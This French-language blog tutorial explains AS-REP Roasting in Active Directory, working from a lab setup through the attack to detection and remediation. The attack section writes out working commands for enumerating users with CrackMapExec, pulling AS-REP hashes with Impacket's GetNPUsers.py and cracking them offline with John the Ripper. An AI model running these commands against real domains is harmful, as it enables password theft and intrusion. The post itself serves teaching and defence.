---
title: "Maîtriser l'AS-REP Roasting : De la Vulnérabilité au Crack de Mot de Passe"
date: 2026-01-28
draft: false
tags: ["Active Directory", "Kerberos", "Pentest", "Brute Force", "Sécurité"]
categories: ["Attaques AD"]
summary: "Découvrez le fonctionnement de l'attaque AS-REP Roasting, comment identifier les comptes vulnérables et les méthodes pour s'en protéger efficacement."
showToc: true
tocOpen: true
---

## Introduction 

Dans un environnement **Active Directory**, le protocole **Kerberos** est le pilier de l'authentification. Avant qu'un utilisateur puisse accéder aux ressources du réseau, il doit prouver son identité auprès du contrôleur de domaine (DC). 

Ce processus commence par une requête appelée **AS-REQ** (*Authentication Service Request*). Par défaut, Kerberos utilise une sécurité appelée **pré-authentification**. Cependant, lorsque cette sécurité est mal configurée, elle ouvre la porte à une attaque redoutable et discrète : l'**AS-REP Roasting**.

---

## Le Mécanisme de Pré-authentification Kerberos



### Qu'est-ce que la Pré-authentification ?
C'est une étape cruciale où le client chiffre un horodatage (timestamp) avec le hachage de son propre mot de passe. Cela prouve au **KDC (Key Distribution Center)** que l'utilisateur possède bien le mot de passe avant même que le serveur ne délivre un ticket.

### Déroulement technique
1. **AS_REQ** : Le client envoie son identité et l'horodatage chiffré.
2. **Vérification** : Le KDC déchiffre l'horodatage avec le hash du mot de passe stocké dans sa base NTDS.dit.
3. **AS_REP** : Si le déchiffrement réussit et que l'heure est synchronisée (marge de 5 min), le KDC renvoie un **TGT (Ticket Granting Ticket)**.

---

## Comprendre l'attaque AS-REP Roasting

L'attaque cible spécifiquement les comptes où l'attribut `DONT_REQ_PREAUTH` est activé. 

### Le point de rupture
Si la pré-authentification n'est pas requise, n'importe quel attaquant peut envoyer une requête **AS-REQ** pour n'importe quel utilisateur connu sans fournir de preuve (pas de mot de passe nécessaire). Le KDC répondra alors par un message **AS-REP** contenant une section chiffrée avec le hash du mot de passe de la victime.

> **Pourquoi est-ce dangereux ?** L'attaquant récupère cette réponse et peut tenter de casser le mot de passe **hors ligne**, sans jamais générer de logs de verrouillage de compte sur le contrôleur de domaine.

---

## Laboratoire : Mise en place de la vulnérabilité

### 1. Création d'un utilisateur vulnérable
Pour tester cette attaque, nous créons un utilisateur dans la console "Utilisateurs et ordinateurs Active Directory" :

* **Nom** : `John Doe`
* **Identifiant** : `jdoe`
* **Configuration** : Dans l'onglet **Compte**, cochez l'option **"L'authentification préalable Kerberos n'est pas requise"**.



---

## Exploitation de l'attaque (Step-by-Step)

### Étape 1 : Énumération des utilisateurs
Avant de "roaster", nous devons savoir qui est vulnérable. On peut utiliser des outils comme **CrackMapExec** pour lister les utilisateurs du domaine.

```bash
# Lister les utilisateurs du domaine
crackmapexec smb 192.168.1.10 -u 'guest' -p '' --users

```

![usercreate](/images/aesr.png)
### Étape 2 : Récupération des Hashes (Impacket)

L'outil de référence est `GetNPUsers.py` de la suite Impacket. Il va interroger le DC et récupérer les parties chiffrées des AS-REP pour les utilisateurs sans pré-authentification.

Bash

```
# Requête pour obtenir le hash de l'utilisateur vulnérable
python3 GetNPUsers.py nyoma.local/ -usersfile users.txt -format john -outputfile asrep_hashes.txt
```

![usercreate](/images/enuusers.png)


### Étape 3 : Cracking hors ligne

Une fois le hash récupéré dans notre fichier `asrep_hashes.txt`, nous utilisons **John the Ripper** ou **Hashcat**.

Bash

```
# Utilisation de John avec la liste rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt
```

---

![usercreate](/images/brtuf.png)

## Détection et Surveillance

Pour repérer cette attaque, il faut surveiller les journaux d'événements Windows sur les contrôleurs de domaine :

|**ID d'événement**|**Description**|**Point d'attention**|
|---|---|---|
|**4768**|Un ticket de service d'authentification (TGT) a été demandé|Vérifier si le champ "Type de pré-authentification" est à **0** (signifie aucune).|
|**4738**|Un compte d'utilisateur a été modifié|Surveiller les changements sur l'attribut `UserAccountControl`.|

---

## Comment se protéger ? (Remédiation)

La défense contre l'AS-REP Roasting est relativement simple mais nécessite de la rigueur :

1. **Audit des comptes** : Identifiez tous les comptes ayant l'option "Pré-authentification non requise" via PowerShell :
    
    PowerShell
    
    ```
    Get-ADUser -Filter 'DoesNotRequirePreAuth -eq $True' -Properties DoesNotRequirePreAuth
    ```
    
2. **Désactivation de l'option** : Sauf besoin applicatif très spécifique (et rare), décochez cette option sur tous les comptes.
    
3. **Mots de passe complexes** : Si l'option doit rester active, utilisez des mots de passe extrêmement longs (25+ caractères) ou des **Managed Service Accounts (gMSA)** pour rendre le cracking impossible.
    
4. **Principe du moindre privilège** : Ne jamais accorder de droits d'administration à des comptes vulnérables à cette attaque.
    
https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py
https://www.hackthebox.com/blog/as-rep-roasting-detection
https://netwrix.com/en/cybersecurity-glossary/cyber-security-attacks/as-rep-roasting/